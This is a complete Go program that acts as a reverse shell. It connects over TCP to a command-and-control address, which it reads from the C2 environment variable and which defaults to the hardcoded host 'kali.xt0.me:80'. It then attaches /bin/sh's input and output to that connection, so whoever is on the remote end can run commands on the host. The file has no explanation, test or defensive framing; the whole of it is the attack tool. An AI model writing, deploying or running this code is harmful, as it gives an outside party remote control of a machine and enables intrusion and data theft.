package main

import (
	"log"
	"net"
	"os"
	"os/exec"
)

func connect(c2 string) {
	c, err := net.Dial("tcp", c2)
	if nil != err {
		log.Fatalf("Could not open TCP connection!!")
	}
	defer c.Close()
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func main() {
	c2 := os.Getenv("C2")
	if c2 == "" {
		c2 = "kali.xt0.me:80"
	}
	connect(c2)
}
